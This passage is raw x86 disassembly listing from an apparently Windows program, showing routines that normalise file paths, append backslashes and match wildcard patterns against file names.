  4031d9:	53                   	push   %ebx
  4031da:	e8 ac a3 01 00       	call   0x41d58b
  4031df:	59                   	pop    %ecx
  4031e0:	59                   	pop    %ecx
  4031e1:	85 c0                	test   %eax,%eax
  4031e3:	74 11                	je     0x4031f6
  4031e5:	68 e4 a5 42 00       	push   $0x42a5e4
  4031ea:	53                   	push   %ebx
  4031eb:	e8 9b a3 01 00       	call   0x41d58b
  4031f0:	59                   	pop    %ecx
  4031f1:	59                   	pop    %ecx
  4031f2:	85 c0                	test   %eax,%eax
  4031f4:	75 19                	jne    0x40320f
  4031f6:	33 db                	xor    %ebx,%ebx
  4031f8:	88 9f 44 10 00 00    	mov    %bl,0x1044(%edi)
  4031fe:	66 39 1e             	cmp    %bx,(%esi)
  403201:	0f 85 6d ff ff ff    	jne    0x403174
  403207:	32 c0                	xor    %al,%al
  403209:	5f                   	pop    %edi
  40320a:	5e                   	pop    %esi
  40320b:	5b                   	pop    %ebx
  40320c:	c2 08 00             	ret    $0x8
  40320f:	b0 01                	mov    $0x1,%al
  403211:	eb f6                	jmp    0x403209
  403213:	56                   	push   %esi
  403214:	68 00 08 00 00       	push   $0x800
  403219:	ff 74 24 0c          	push   0xc(%esp)
  40321d:	8b f1                	mov    %ecx,%esi
  40321f:	56                   	push   %esi
  403220:	e8 52 3e 00 00       	call   0x407077
  403225:	c6 86 00 10 00 00 01 	movb   $0x1,0x1000(%esi)
  40322c:	5e                   	pop    %esi
  40322d:	c2 04 00             	ret    $0x4
  403230:	b8 54 12 00 00       	mov    $0x1254,%eax
  403235:	e8 c6 33 01 00       	call   0x416600
  40323a:	a1 5c 56 43 00       	mov    0x43565c,%eax
  40323f:	33 c4                	xor    %esp,%eax
  403241:	89 84 24 50 12 00 00 	mov    %eax,0x1250(%esp)
  403248:	53                   	push   %ebx
  403249:	8b 9c 24 60 12 00 00 	mov    0x1260(%esp),%ebx
  403250:	8d 44 24 04          	lea    0x4(%esp),%eax
  403254:	55                   	push   %ebp
  403255:	56                   	push   %esi
  403256:	8b b4 24 64 12 00 00 	mov    0x1264(%esp),%esi
  40325d:	83 cd ff             	or     $0xffffffff,%ebp
  403260:	57                   	push   %edi
  403261:	8b bc 24 70 12 00 00 	mov    0x1270(%esp),%edi
  403268:	50                   	push   %eax
  403269:	3b f5                	cmp    %ebp,%esi
  40326b:	75 63                	jne    0x4032d0
  40326d:	53                   	push   %ebx
  40326e:	ff 15 54 a0 42 00    	call   *0x42a054
  403274:	8b f0                	mov    %eax,%esi
  403276:	3b f5                	cmp    %ebp,%esi
  403278:	75 71                	jne    0x4032eb
  40327a:	68 00 08 00 00       	push   $0x800
  40327f:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  403286:	50                   	push   %eax
  403287:	53                   	push   %ebx
  403288:	e8 10 0a 00 00       	call   0x403c9d
  40328d:	84 c0                	test   %al,%al
  40328f:	74 19                	je     0x4032aa
  403291:	8d 44 24 10          	lea    0x10(%esp),%eax
  403295:	50                   	push   %eax
  403296:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  40329d:	50                   	push   %eax
  40329e:	ff 15 54 a0 42 00    	call   *0x42a054
  4032a4:	8b f0                	mov    %eax,%esi
  4032a6:	3b f5                	cmp    %ebp,%esi
  4032a8:	75 41                	jne    0x4032eb
  4032aa:	ff 15 00 a0 42 00    	call   *0x42a000
  4032b0:	83 f8 02             	cmp    $0x2,%eax
  4032b3:	74 0e                	je     0x4032c3
  4032b5:	83 f8 03             	cmp    $0x3,%eax
  4032b8:	74 09                	je     0x4032c3
  4032ba:	83 f8 12             	cmp    $0x12,%eax
  4032bd:	74 04                	je     0x4032c3
  4032bf:	b0 01                	mov    $0x1,%al
  4032c1:	eb 02                	jmp    0x4032c5
  4032c3:	32 c0                	xor    %al,%al
  4032c5:	88 87 44 10 00 00    	mov    %al,0x1044(%edi)
  4032cb:	e9 c3 00 00 00       	jmp    0x403393
  4032d0:	56                   	push   %esi
  4032d1:	ff 15 58 a0 42 00    	call   *0x42a058
  4032d7:	85 c0                	test   %eax,%eax
  4032d9:	75 10                	jne    0x4032eb
  4032db:	8b f5                	mov    %ebp,%esi
  4032dd:	ff 15 00 a0 42 00    	call   *0x42a000
  4032e3:	83 f8 12             	cmp    $0x12,%eax
  4032e6:	0f 95 c0             	setne  %al
  4032e9:	eb da                	jmp    0x4032c5
  4032eb:	bd 00 08 00 00       	mov    $0x800,%ebp
  4032f0:	55                   	push   %ebp
  4032f1:	53                   	push   %ebx
  4032f2:	57                   	push   %edi
  4032f3:	e8 7f 3d 00 00       	call   0x407077
  4032f8:	55                   	push   %ebp
  4032f9:	8d 44 24 40          	lea    0x40(%esp),%eax
  4032fd:	50                   	push   %eax
  4032fe:	57                   	push   %edi
  4032ff:	e8 e0 0d 00 00       	call   0x4040e4
  403304:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  403308:	33 c0                	xor    %eax,%eax
  40330a:	03 44 24 30          	add    0x30(%esp),%eax
  40330e:	89 87 00 10 00 00    	mov    %eax,0x1000(%edi)
  403314:	8b 44 24 10          	mov    0x10(%esp),%eax
  403318:	83 d1 00             	adc    $0x0,%ecx
  40331b:	89 87 08 10 00 00    	mov    %eax,0x1008(%edi)
  403321:	8b 44 24 14          	mov    0x14(%esp),%eax
  403325:	89 8f 04 10 00 00    	mov    %ecx,0x1004(%edi)
  40332b:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40332f:	89 87 28 10 00 00    	mov    %eax,0x1028(%edi)
  403335:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403339:	89 8f 2c 10 00 00    	mov    %ecx,0x102c(%edi)
  40333f:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403343:	89 87 30 10 00 00    	mov    %eax,0x1030(%edi)
  403349:	8b 44 24 24          	mov    0x24(%esp),%eax
  40334d:	89 8f 34 10 00 00    	mov    %ecx,0x1034(%edi)
  403353:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  403357:	89 87 38 10 00 00    	mov    %eax,0x1038(%edi)
  40335d:	8d 44 24 24          	lea    0x24(%esp),%eax
  403361:	89 8f 3c 10 00 00    	mov    %ecx,0x103c(%edi)
  403367:	8d 8f 10 10 00 00    	lea    0x1010(%edi),%ecx
  40336d:	50                   	push   %eax
  40336e:	e8 b7 47 00 00       	call   0x407b2a
  403373:	8d 44 24 14          	lea    0x14(%esp),%eax
  403377:	50                   	push   %eax
  403378:	8d 8f 18 10 00 00    	lea    0x1018(%edi),%ecx
  40337e:	e8 a7 47 00 00       	call   0x407b2a
  403383:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403387:	50                   	push   %eax
  403388:	8d 8f 20 10 00 00    	lea    0x1020(%edi),%ecx
  40338e:	e8 97 47 00 00       	call   0x407b2a
  403393:	83 a7 40 10 00 00 00 	andl   $0x0,0x1040(%edi)
  40339a:	8b c6                	mov    %esi,%eax
  40339c:	8b 8c 24 60 12 00 00 	mov    0x1260(%esp),%ecx
  4033a3:	5f                   	pop    %edi
  4033a4:	5e                   	pop    %esi
  4033a5:	5d                   	pop    %ebp
  4033a6:	5b                   	pop    %ebx
  4033a7:	33 cc                	xor    %esp,%ecx
  4033a9:	e8 ab 31 01 00       	call   0x416559
  4033ae:	81 c4 54 12 00 00    	add    $0x1254,%esp
  4033b4:	c2 0c 00             	ret    $0xc
  4033b7:	55                   	push   %ebp
  4033b8:	8d ac 24 68 ff ff ff 	lea    -0x98(%esp),%ebp
  4033bf:	81 ec 18 01 00 00    	sub    $0x118,%esp
  4033c5:	a1 5c 56 43 00       	mov    0x43565c,%eax
  4033ca:	33 c5                	xor    %ebp,%eax
  4033cc:	89 85 94 00 00 00    	mov    %eax,0x94(%ebp)
  4033d2:	8b 0d 00 50 43 00    	mov    0x435000,%ecx
  4033d8:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4033db:	75 2d                	jne    0x40340a
  4033dd:	8d 45 80             	lea    -0x80(%ebp),%eax
  4033e0:	c7 45 80 14 01 00 00 	movl   $0x114,-0x80(%ebp)
  4033e7:	50                   	push   %eax
  4033e8:	ff 15 5c a0 42 00    	call   *0x42a05c
  4033ee:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4033f1:	8b 45 84             	mov    -0x7c(%ebp),%eax
  4033f4:	8b 55 88             	mov    -0x78(%ebp),%edx
  4033f7:	89 0d 00 50 43 00    	mov    %ecx,0x435000
  4033fd:	a3 20 7f 43 00       	mov    %eax,0x437f20
  403402:	89 15 24 7f 43 00    	mov    %edx,0x437f24
  403408:	eb 0b                	jmp    0x403415
  40340a:	a1 20 7f 43 00       	mov    0x437f20,%eax
  40340f:	8b 15 24 7f 43 00    	mov    0x437f24,%edx
  403415:	83 f9 02             	cmp    $0x2,%ecx
  403418:	75 07                	jne    0x403421
  40341a:	c1 e0 08             	shl    $0x8,%eax
  40341d:	03 c2                	add    %edx,%eax
  40341f:	eb 05                	jmp    0x403426
  403421:	b8 01 05 00 00       	mov    $0x501,%eax
  403426:	8b 8d 94 00 00 00    	mov    0x94(%ebp),%ecx
  40342c:	33 cd                	xor    %ebp,%ecx
  40342e:	e8 26 31 01 00       	call   0x416559
  403433:	81 c5 98 00 00 00    	add    $0x98,%ebp
  403439:	c9                   	leave
  40343a:	c3                   	ret
  40343b:	b8 0c 20 00 00       	mov    $0x200c,%eax
  403440:	e8 bb 31 01 00       	call   0x416600
  403445:	a1 5c 56 43 00       	mov    0x43565c,%eax
  40344a:	33 c4                	xor    %esp,%eax
  40344c:	89 84 24 08 20 00 00 	mov    %eax,0x2008(%esp)
  403453:	8b 84 24 18 20 00 00 	mov    0x2018(%esp),%eax
  40345a:	8b c8                	mov    %eax,%ecx
  40345c:	53                   	push   %ebx
  40345d:	55                   	push   %ebp
  40345e:	8b ac 24 1c 20 00 00 	mov    0x201c(%esp),%ebp
  403465:	c1 e9 1f             	shr    $0x1f,%ecx
  403468:	56                   	push   %esi
  403469:	0f b7 f0             	movzwl %ax,%esi
  40346c:	88 4c 24 0c          	mov    %cl,0xc(%esp)
  403470:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403474:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403478:	57                   	push   %edi
  403479:	8b bc 24 20 20 00 00 	mov    0x2020(%esp),%edi
  403480:	85 f6                	test   %esi,%esi
  403482:	0f 84 0a 01 00 00    	je     0x403592
  403488:	57                   	push   %edi
  403489:	e8 a5 7d 01 00       	call   0x41b233
  40348e:	89 44 24 14          	mov    %eax,0x14(%esp)
  403492:	59                   	pop    %ecx
  403493:	83 fe 02             	cmp    $0x2,%esi
  403496:	74 4c                	je     0x4034e4
  403498:	83 fe 04             	cmp    $0x4,%esi
  40349b:	74 47                	je     0x4034e4
  40349d:	83 fe 03             	cmp    $0x3,%esi
  4034a0:	74 42                	je     0x4034e4
  4034a2:	80 7c 24 14 00       	cmpb   $0x0,0x14(%esp)
  4034a7:	50                   	push   %eax
  4034a8:	55                   	push   %ebp
  4034a9:	57                   	push   %edi
  4034aa:	74 0a                	je     0x4034b6
  4034ac:	e8 1a a1 01 00       	call   0x41d5cb
  4034b1:	83 c4 0c             	add    $0xc,%esp
  4034b4:	eb 05                	jmp    0x4034bb
  4034b6:	e8 b3 50 00 00       	call   0x40856e
  4034bb:	85 c0                	test   %eax,%eax
  4034bd:	75 1c                	jne    0x4034db
  4034bf:	8b 44 24 10          	mov    0x10(%esp),%eax
  4034c3:	0f b7 44 45 00       	movzwl 0x0(%ebp,%eax,2),%eax
  4034c8:	83 f8 5c             	cmp    $0x5c,%eax
  4034cb:	74 0a                	je     0x4034d7
  4034cd:	83 f8 2f             	cmp    $0x2f,%eax
  4034d0:	74 05                	je     0x4034d7
  4034d2:	66 85 c0             	test   %ax,%ax
  4034d5:	75 04                	jne    0x4034db
  4034d7:	b0 01                	mov    $0x1,%al
  4034d9:	eb 5e                	jmp    0x403539
  4034db:	83 fe 01             	cmp    $0x1,%esi
  4034de:	0f 84 0a 01 00 00    	je     0x4035ee
  4034e4:	68 00 08 00 00       	push   $0x800
  4034e9:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4034ed:	50                   	push   %eax
  4034ee:	57                   	push   %edi
  4034ef:	e8 83 06 00 00       	call   0x403b77
  4034f4:	68 00 08 00 00       	push   $0x800
  4034f9:	8d 84 24 1c 10 00 00 	lea    0x101c(%esp),%eax
  403500:	50                   	push   %eax
  403501:	55                   	push   %ebp
  403502:	e8 70 06 00 00       	call   0x403b77
  403507:	83 fe 02             	cmp    $0x2,%esi
  40350a:	74 05                	je     0x403511
  40350c:	83 fe 04             	cmp    $0x4,%esi
  40350f:	75 1b                	jne    0x40352c
  403511:	53                   	push   %ebx
  403512:	8d 84 24 1c 10 00 00 	lea    0x101c(%esp),%eax
  403519:	50                   	push   %eax
  40351a:	8d 44 24 20          	lea    0x20(%esp),%eax
  40351e:	50                   	push   %eax
  40351f:	e8 22 02 00 00       	call   0x403746
  403524:	85 c0                	test   %eax,%eax
  403526:	0f 85 c2 00 00 00    	jne    0x4035ee
  40352c:	83 fe 03             	cmp    $0x3,%esi
  40352f:	75 23                	jne    0x403554
  403531:	53                   	push   %ebx
  403532:	55                   	push   %ebp
  403533:	57                   	push   %edi
  403534:	e8 bc 00 00 00       	call   0x4035f5
  403539:	8b 8c 24 18 20 00 00 	mov    0x2018(%esp),%ecx
  403540:	5f                   	pop    %edi
  403541:	5e                   	pop    %esi
  403542:	5d                   	pop    %ebp
  403543:	5b                   	pop    %ebx
  403544:	33 cc                	xor    %esp,%ecx
  403546:	e8 0e 30 01 00       	call   0x416559
  40354b:	81 c4 0c 20 00 00    	add    $0x200c,%esp
  403551:	c2 0c 00             	ret    $0xc
  403554:	83 fe 05             	cmp    $0x5,%esi
  403557:	74 05                	je     0x40355e
  403559:	83 fe 06             	cmp    $0x6,%esi
  40355c:	75 34                	jne    0x403592
  40355e:	8d 44 24 18          	lea    0x18(%esp),%eax
  403562:	50                   	push   %eax
  403563:	e8 62 09 00 00       	call   0x403eca
  403568:	84 c0                	test   %al,%al
  40356a:	75 c5                	jne    0x403531
  40356c:	83 fe 05             	cmp    $0x5,%esi
  40356f:	74 44                	je     0x4035b5
  403571:	57                   	push   %edi
  403572:	e8 53 09 00 00       	call   0x403eca
  403577:	84 c0                	test   %al,%al
  403579:	75 3a                	jne    0x4035b5
  40357b:	53                   	push   %ebx
  40357c:	8d 84 24 1c 10 00 00 	lea    0x101c(%esp),%eax
  403583:	50                   	push   %eax
  403584:	8d 44 24 20          	lea    0x20(%esp),%eax
  403588:	50                   	push   %eax
  403589:	e8 b8 01 00 00       	call   0x403746
  40358e:	85 c0                	test   %eax,%eax
  403590:	75 5c                	jne    0x4035ee
  403592:	57                   	push   %edi
  403593:	e8 91 0a 00 00       	call   0x404029
  403598:	55                   	push   %ebp
  403599:	8b f8                	mov    %eax,%edi
  40359b:	e8 89 0a 00 00       	call   0x404029
  4035a0:	53                   	push   %ebx
  4035a1:	50                   	push   %eax
  4035a2:	83 fe 02             	cmp    $0x2,%esi
  4035a5:	75 8c                	jne    0x403533
  4035a7:	57                   	push   %edi
  4035a8:	e8 99 01 00 00       	call   0x403746
  4035ad:	f7 d8                	neg    %eax
  4035af:	1a c0                	sbb    %al,%al
  4035b1:	fe c0                	inc    %al
  4035b3:	eb 84                	jmp    0x403539
  4035b5:	66 83 7c 24 18 00    	cmpw   $0x0,0x18(%esp)
  4035bb:	74 d5                	je     0x403592
  4035bd:	8d 44 24 18          	lea    0x18(%esp),%eax
  4035c1:	50                   	push   %eax
  4035c2:	e8 6c 7c 01 00       	call   0x41b233
  4035c7:	80 7c 24 18 00       	cmpb   $0x0,0x18(%esp)
  4035cc:	59                   	pop    %ecx
  4035cd:	50                   	push   %eax
  4035ce:	8d 84 24 1c 10 00 00 	lea    0x101c(%esp),%eax
  4035d5:	50                   	push   %eax
  4035d6:	8d 44 24 20          	lea    0x20(%esp),%eax
  4035da:	50                   	push   %eax
  4035db:	74 0a                	je     0x4035e7
  4035dd:	e8 e9 9f 01 00       	call   0x41d5cb
  4035e2:	83 c4 0c             	add    $0xc,%esp
  4035e5:	eb a7                	jmp    0x40358e
  4035e7:	e8 82 4f 00 00       	call   0x40856e
  4035ec:	eb a0                	jmp    0x40358e
  4035ee:	32 c0                	xor    %al,%al
  4035f0:	e9 44 ff ff ff       	jmp    0x403539
  4035f5:	51                   	push   %ecx
  4035f6:	51                   	push   %ecx
  4035f7:	53                   	push   %ebx
  4035f8:	55                   	push   %ebp
  4035f9:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4035fd:	56                   	push   %esi
  4035fe:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  403602:	57                   	push   %edi
  403603:	6a 2e                	push   $0x2e
  403605:	c7 44 24 18 2a 00 00 	movl   $0x2a,0x18(%esp)
  40360c:	00 
  40360d:	5b                   	pop    %ebx
  40360e:	ff 74 24 24          	push   0x24(%esp)
  403612:	0f b7 06             	movzwl (%esi),%eax
  403615:	50                   	push   %eax
  403616:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40361a:	e8 48 01 00 00       	call   0x403767
  40361f:	ff 74 24 24          	push   0x24(%esp)
  403623:	0f b7 f8             	movzwl %ax,%edi
  403626:	0f b7 45 00          	movzwl 0x0(%ebp),%eax
  40362a:	50                   	push   %eax
  40362b:	e8 37 01 00 00       	call   0x403767
  403630:	0f b7 c8             	movzwl %ax,%ecx
  403633:	83 c5 02             	add    $0x2,%ebp
  403636:	8b d1                	mov    %ecx,%edx
  403638:	8b c1                	mov    %ecx,%eax
  40363a:	66 85 d2             	test   %dx,%dx
  40363d:	0f 84 f4 00 00 00    	je     0x403737
  403643:	66 3b 54 24 14       	cmp    0x14(%esp),%dx
  403648:	74 35                	je     0x40367f
  40364a:	83 f9 3f             	cmp    $0x3f,%ecx
  40364d:	74 22                	je     0x403671
  40364f:	66 3b c7             	cmp    %di,%ax
  403652:	74 26                	je     0x40367a
  403654:	66 3b c3             	cmp    %bx,%ax
  403657:	0f 85 d2 00 00 00    	jne    0x40372f
  40365d:	66 85 ff             	test   %di,%di
  403660:	74 ac                	je     0x40360e
  403662:	83 ff 5c             	cmp    $0x5c,%edi
  403665:	74 a7                	je     0x40360e
  403667:	66 3b fb             	cmp    %bx,%di
  40366a:	74 a2                	je     0x40360e
  40366c:	e9 be 00 00 00       	jmp    0x40372f
  403671:	66 85 ff             	test   %di,%di
  403674:	0f 84 b5 00 00 00    	je     0x40372f
  40367a:	83 c6 02             	add    $0x2,%esi
  40367d:	eb 8f                	jmp    0x40360e
  40367f:	0f b7 45 00          	movzwl 0x0(%ebp),%eax
  403683:	66 85 c0             	test   %ax,%ax
  403686:	0f 84 a7 00 00 00    	je     0x403733
  40368c:	6a 2e                	push   $0x2e
  40368e:	5a                   	pop    %edx
  40368f:	33 db                	xor    %ebx,%ebx
  403691:	66 3b c2             	cmp    %dx,%ax
  403694:	0f 85 90 00 00 00    	jne    0x40372a
  40369a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40369e:	6a 2a                	push   $0x2a
  4036a0:	5f                   	pop    %edi
  4036a1:	66 39 79 04          	cmp    %di,0x4(%ecx)
  4036a5:	75 0a                	jne    0x4036b1
  4036a7:	66 39 59 06          	cmp    %bx,0x6(%ecx)
  4036ab:	0f 84 82 00 00 00    	je     0x403733
  4036b1:	52                   	push   %edx
  4036b2:	56                   	push   %esi
  4036b3:	e8 e8 44 01 00       	call   0x417ba0
  4036b8:	8b f8                	mov    %eax,%edi
  4036ba:	8b 44 24 18          	mov    0x18(%esp),%eax
  4036be:	59                   	pop    %ecx
  4036bf:	59                   	pop    %ecx
  4036c0:	66 39 58 04          	cmp    %bx,0x4(%eax)
  4036c4:	75 10                	jne    0x4036d6
  4036c6:	85 ff                	test   %edi,%edi
  4036c8:	74 06                	je     0x4036d0
  4036ca:	66 39 5f 02          	cmp    %bx,0x2(%edi)
  4036ce:	75 02                	jne    0x4036d2
  4036d0:	b3 01                	mov    $0x1,%bl
  4036d2:	8a c3                	mov    %bl,%al
  4036d4:	eb 67                	jmp    0x40373d
  4036d6:	85 ff                	test   %edi,%edi
  4036d8:	74 50                	je     0x40372a
  4036da:	68 ec a5 42 00       	push   $0x42a5ec
  4036df:	55                   	push   %ebp
  4036e0:	8b f7                	mov    %edi,%esi
  4036e2:	e8 61 9f 01 00       	call   0x41d648
  4036e7:	59                   	pop    %ecx
  4036e8:	59                   	pop    %ecx
  4036e9:	85 c0                	test   %eax,%eax
  4036eb:	75 3d                	jne    0x40372a
  4036ed:	83 c7 02             	add    $0x2,%edi
  4036f0:	6a 2e                	push   $0x2e
  4036f2:	57                   	push   %edi
  4036f3:	e8 a8 44 01 00       	call   0x417ba0
  4036f8:	59                   	pop    %ecx
  4036f9:	59                   	pop    %ecx
  4036fa:	85 c0                	test   %eax,%eax
  4036fc:	75 2c                	jne    0x40372a
  4036fe:	ff 74 24 24          	push   0x24(%esp)
  403702:	8b 44 24 14          	mov    0x14(%esp),%eax
  403706:	57                   	push   %edi
  403707:	83 c0 04             	add    $0x4,%eax
  40370a:	50                   	push   %eax
  40370b:	e8 36 00 00 00       	call   0x403746
  403710:	f7 d8                	neg    %eax
  403712:	1a c0                	sbb    %al,%al
  403714:	fe c0                	inc    %al
  403716:	eb 25                	jmp    0x40373d
  403718:	ff 74 24 24          	push   0x24(%esp)
  40371c:	56                   	push   %esi
  40371d:	55                   	push   %ebp
  40371e:	e8 d2 fe ff ff       	call   0x4035f5
  403723:	83 c6 02             	add    $0x2,%esi
  403726:	84 c0                	test   %al,%al
  403728:	75 09                	jne    0x403733
  40372a:	66 39 1e             	cmp    %bx,(%esi)
  40372d:	75 e9                	jne    0x403718
  40372f:	32 c0                	xor    %al,%al
  403731:	eb 0a                	jmp    0x40373d
  403733:	b0 01                	mov    $0x1,%al
  403735:	eb 06                	jmp    0x40373d
  403737:	66 85 ff             	test   %di,%di
  40373a:	0f 94 c0             	sete   %al
  40373d:	5f                   	pop    %edi
  40373e:	5e                   	pop    %esi
  40373f:	5d                   	pop    %ebp
  403740:	5b                   	pop    %ebx
  403741:	59                   	pop    %ecx
  403742:	59                   	pop    %ecx
  403743:	c2 0c 00             	ret    $0xc
  403746:	55                   	push   %ebp
  403747:	8b ec                	mov    %esp,%ebp
  403749:	80 7d 10 00          	cmpb   $0x0,0x10(%ebp)
  40374d:	ff 75 0c             	push   0xc(%ebp)
  403750:	ff 75 08             	push   0x8(%ebp)
  403753:	74 09                	je     0x40375e
  403755:	e8 31 9e 01 00       	call   0x41d58b
  40375a:	59                   	pop    %ecx
  40375b:	59                   	pop    %ecx
  40375c:	eb 05                	jmp    0x403763
  40375e:	e8 e7 38 00 00       	call   0x40704a
  403763:	5d                   	pop    %ebp
  403764:	c2 0c 00             	ret    $0xc
  403767:	80 7c 24 08 00       	cmpb   $0x0,0x8(%esp)
  40376c:	74 06                	je     0x403774
  40376e:	8b 44 24 04          	mov    0x4(%esp),%eax
  403772:	eb 09                	jmp    0x40377d
  403774:	ff 74 24 04          	push   0x4(%esp)
  403778:	e8 c0 4d 00 00       	call   0x40853d
  40377d:	c2 08 00             	ret    $0x8
  403780:	33 c0                	xor    %eax,%eax
  403782:	56                   	push   %esi
  403783:	8b f1                	mov    %ecx,%esi
  403785:	89 86 98 70 00 00    	mov    %eax,0x7098(%esi)
  40378b:	89 86 9c 70 00 00    	mov    %eax,0x709c(%esi)
  403791:	89 86 a0 70 00 00    	mov    %eax,0x70a0(%esi)
  403797:	89 86 a4 70 00 00    	mov    %eax,0x70a4(%esi)
  40379d:	89 86 a8 70 00 00    	mov    %eax,0x70a8(%esi)
  4037a3:	89 86 ac 70 00 00    	mov    %eax,0x70ac(%esi)
  4037a9:	89 86 b8 70 00 00    	mov    %eax,0x70b8(%esi)
  4037af:	89 86 bc 70 00 00    	mov    %eax,0x70bc(%esi)
  4037b5:	89 86 c0 70 00 00    	mov    %eax,0x70c0(%esi)
  4037bb:	89 86 c4 70 00 00    	mov    %eax,0x70c4(%esi)
  4037c1:	89 86 c8 70 00 00    	mov    %eax,0x70c8(%esi)
  4037c7:	89 86 cc 70 00 00    	mov    %eax,0x70cc(%esi)
  4037cd:	e8 04 00 00 00       	call   0x4037d6
  4037d2:	8b c6                	mov    %esi,%eax
  4037d4:	5e                   	pop    %esi
  4037d5:	c3                   	ret
  4037d6:	56                   	push   %esi
  4037d7:	57                   	push   %edi
  4037d8:	68 d8 91 00 00       	push   $0x91d8
  4037dd:	33 ff                	xor    %edi,%edi
  4037df:	8b f1                	mov    %ecx,%esi
  4037e1:	57                   	push   %edi
  4037e2:	56                   	push   %esi
  4037e3:	e8 a8 3e 01 00       	call   0x417690
  4037e8:	83 c4 0c             	add    $0xc,%esp
  4037eb:	89 be 30 70 00 00    	mov    %edi,0x7030(%esi)
  4037f1:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4037f6:	89 be 28 70 00 00    	mov    %edi,0x7028(%esi)
  4037fc:	89 be 7c 70 00 00    	mov    %edi,0x707c(%esi)
  403802:	c7 46 0c 00 00 00 02 	movl   $0x2000000,0xc(%esi)
  403809:	6a 02                	push   $0x2
  40380b:	59                   	pop    %ecx
  40380c:	5f                   	pop    %edi
  40380d:	c7 86 34 70 00 00 03 	movl   $0x3,0x7034(%esi)
  403814:	00 00 00 
  403817:	89 8e b8 81 00 00    	mov    %ecx,0x81b8(%esi)
  40381d:	89 86 d8 70 00 00    	mov    %eax,0x70d8(%esi)
  403823:	89 86 dc 70 00 00    	mov    %eax,0x70dc(%esi)
  403829:	89 86 e0 70 00 00    	mov    %eax,0x70e0(%esi)
  40382f:	89 86 e4 70 00 00    	mov    %eax,0x70e4(%esi)
  403835:	89 8e 38 70 00 00    	mov    %ecx,0x7038(%esi)
  40383b:	5e                   	pop    %esi
  40383c:	c3                   	ret
  40383d:	56                   	push   %esi
  40383e:	8b 74 24 08          	mov    0x8(%esp),%esi
  403842:	56                   	push   %esi
  403843:	e8 eb 79 01 00       	call   0x41b233
  403848:	59                   	pop    %ecx
  403849:	8b c8                	mov    %eax,%ecx
  40384b:	85 c9                	test   %ecx,%ecx
  40384d:	74 1e                	je     0x40386d
  40384f:	6a 5c                	push   $0x5c
  403851:	5a                   	pop    %edx
  403852:	66 39 54 4e fe       	cmp    %dx,-0x2(%esi,%ecx,2)
  403857:	74 14                	je     0x40386d
  403859:	8d 41 01             	lea    0x1(%ecx),%eax
  40385c:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  403860:	73 0b                	jae    0x40386d
  403862:	33 c0                	xor    %eax,%eax
  403864:	66 89 14 4e          	mov    %dx,(%esi,%ecx,2)
  403868:	66 89 44 4e 02       	mov    %ax,0x2(%esi,%ecx,2)
  40386d:	5e                   	pop    %esi
  40386e:	c2 08 00             	ret    $0x8
  403871:	b8 08 20 00 00       	mov    $0x2008,%eax
  403876:	e8 85 2d 01 00       	call   0x416600
  40387b:	a1 5c 56 43 00       	mov    0x43565c,%eax
  403880:	33 c4                	xor    %esp,%eax
  403882:	89 84 24 04 20 00 00 	mov    %eax,0x2004(%esp)
  403889:	53                   	push   %ebx
  40388a:	55                   	push   %ebp
  40388b:	56                   	push   %esi
  40388c:	8b b4 24 18 20 00 00 	mov    0x2018(%esp),%esi
  403893:	57                   	push   %edi
  403894:	8b bc 24 20 20 00 00 	mov    0x2020(%esp),%edi
  40389b:	85 f6                	test   %esi,%esi
  40389d:	74 7f                	je     0x40391e
  40389f:	66 83 3e 00          	cmpw   $0x0,(%esi)
  4038a3:	74 79                	je     0x40391e
  4038a5:	8d 44 24 10          	lea    0x10(%esp),%eax
  4038a9:	bd 00 08 00 00       	mov    $0x800,%ebp
  4038ae:	50                   	push   %eax
  4038af:	8d 44 24 18          	lea    0x18(%esp),%eax
  4038b3:	50                   	push   %eax
  4038b4:	55                   	push   %ebp
  4038b5:	56                   	push   %esi
  4038b6:	ff 15 64 a0 42 00    	call   *0x42a064
  4038bc:	8b d8                	mov    %eax,%ebx
  4038be:	85 db                	test   %ebx,%ebx
  4038c0:	74 04                	je     0x4038c6
  4038c2:	3b dd                	cmp    %ebp,%ebx
  4038c4:	76 34                	jbe    0x4038fa
  4038c6:	55                   	push   %ebp
  4038c7:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  4038ce:	50                   	push   %eax
  4038cf:	56                   	push   %esi
  4038d0:	e8 c8 03 00 00       	call   0x403c9d
  4038d5:	84 c0                	test   %al,%al
  4038d7:	74 1b                	je     0x4038f4
  4038d9:	8d 44 24 10          	lea    0x10(%esp),%eax
  4038dd:	50                   	push   %eax
  4038de:	8d 44 24 18          	lea    0x18(%esp),%eax
  4038e2:	50                   	push   %eax
  4038e3:	55                   	push   %ebp
  4038e4:	8d 84 24 20 10 00 00 	lea    0x1020(%esp),%eax
  4038eb:	50                   	push   %eax
  4038ec:	ff 15 64 a0 42 00    	call   *0x42a064
  4038f2:	8b d8                	mov    %eax,%ebx
  4038f4:	85 db                	test   %ebx,%ebx
  4038f6:	74 12                	je     0x40390a
  4038f8:	3b dd                	cmp    %ebp,%ebx
  4038fa:	73 0e                	jae    0x40390a
  4038fc:	ff b4 24 24 20 00 00 	push   0x2024(%esp)
  403903:	8d 44 24 18          	lea    0x18(%esp),%eax
  403907:	50                   	push   %eax
  403908:	eb 0c                	jmp    0x403916
  40390a:	3b f7                	cmp    %edi,%esi
  40390c:	74 1f                	je     0x40392d
  40390e:	ff b4 24 24 20 00 00 	push   0x2024(%esp)
  403915:	56                   	push   %esi
  403916:	57                   	push   %edi
  403917:	e8 5b 37 00 00       	call   0x407077
  40391c:	eb 0f                	jmp    0x40392d
